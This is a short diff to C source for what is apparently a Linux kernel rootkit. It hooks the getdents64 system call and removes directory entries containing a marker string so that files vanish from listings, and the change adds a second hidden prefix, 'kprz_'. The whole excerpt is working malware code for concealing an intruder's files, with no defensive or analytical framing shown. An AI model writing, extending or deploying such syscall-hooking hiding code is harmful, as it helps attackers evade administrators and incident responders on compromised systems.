@@ -7,6 +7,7 @@
 asmlinkage long (*real_getdents64)(const struct pt_regs *);
 
 #define HIDE_MARKER "rootkit_hidden"
+#define INODE_HIDE_MARKER "kprz_"
 
 struct linux_dirent64 {
     u64 d_ino;
@@ -36,7 +37,7 @@ asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
 
     while (offset < ret) {
         cur = (void *)dirent + offset;
-        if (strnstr(cur->d_name, HIDE_MARKER, cur->d_reclen)) {
+        if (strnstr(cur->d_name, HIDE_MARKER, cur->d_reclen) || strnstr(cur->d_name, INODE_HIDE_MARKER, cur->d_reclen)) {
             if (cur == dirent) {
                 ret -= cur->d_reclen;
                 memmove(cur, (void *)cur + cur->d_reclen, ret);
